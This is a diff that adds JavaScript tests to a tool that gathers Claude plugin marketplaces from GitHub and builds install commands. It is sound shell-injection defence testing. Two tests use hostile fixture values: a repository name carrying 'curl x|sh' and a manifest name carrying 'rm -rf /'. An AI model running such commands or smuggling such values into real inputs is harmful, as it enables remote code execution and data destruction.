@@ -54,3 +54,28 @@ test('collect returns ok:false when the search call fails', async () => {
   assert.equal(res.ok, false);
   assert.deepEqual(res.capabilities, []);
 });
+
+test('parseCodeSearch dedupes case-insensitively', () => {
+  const json = { items: [
+    { repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' },
+    { repository: { full_name: 'owner/repo' }, path: '.claude-plugin/marketplace.json' }
+  ] };
+  assert.equal(github.parseCodeSearch(json).length, 1);
+});
+
+test('collect skips repos whose full_name is unsafe (shell-injection defense)', async () => {
+  const CS = { items: [{ repository: { full_name: 'evil/repo && curl x|sh' }, path: '.claude-plugin/marketplace.json' }] };
+  const fetchJson = async (url) => url.includes('/search/code') ? CS : { name: 'm', plugins: [{ name: 'p' }] };
+  const res = await github.collect({ fetchJson, now: 't', githubToken: null });
+  assert.deepEqual(res.capabilities, []);            // unsafe repo skipped before any command is built
+});
+
+test('collect falls back to a safe marketplace name when manifest.name is unsafe', async () => {
+  const CS = { items: [{ repository: { full_name: 'Owner/Repo' }, path: '.claude-plugin/marketplace.json' }] };
+  const MANIFEST = { name: 'evil && rm -rf /', plugins: [{ name: 'sec' }] };
+  const fetchJson = async (url) => url.includes('/search/code') ? CS : MANIFEST;
+  const res = await github.collect({ fetchJson, now: 't', githubToken: null });
+  assert.equal(res.capabilities.length, 1);
+  // unsafe manifest name dropped -> fallback "Owner-Repo"; no stray shell metacharacters from the name
+  assert.equal(res.capabilities[0].install.command, 'claude plugin marketplace add Owner/Repo && claude plugin install sec@Owner-Repo');
+});
